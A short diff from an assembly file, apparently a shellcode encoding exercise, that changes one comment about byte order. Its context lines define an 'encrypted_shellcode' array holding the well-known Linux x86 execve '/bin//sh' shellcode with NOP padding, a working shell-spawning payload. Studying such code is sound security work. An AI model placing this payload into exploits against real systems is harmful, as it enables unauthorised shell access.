@@ -91,4 +91,4 @@ shellcode_section:
 		;                       |          A          |           B           |           C           |           D            |          E           |            F          |
 		;						|         ESI         |         ESI+4         |         ESI+8         |         ESI+12         |        ESI+16        |          ESI+20       |
         encrypted_shellcode: db 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x87, 0xe3, 0xb0, 0x0b, 0xcd, 0x80, 0x90, 0x90, 0x90, 0x90, 0x90
-		;						|<-chunk read direction| 
+		;						|<-chunk read direction, little endian
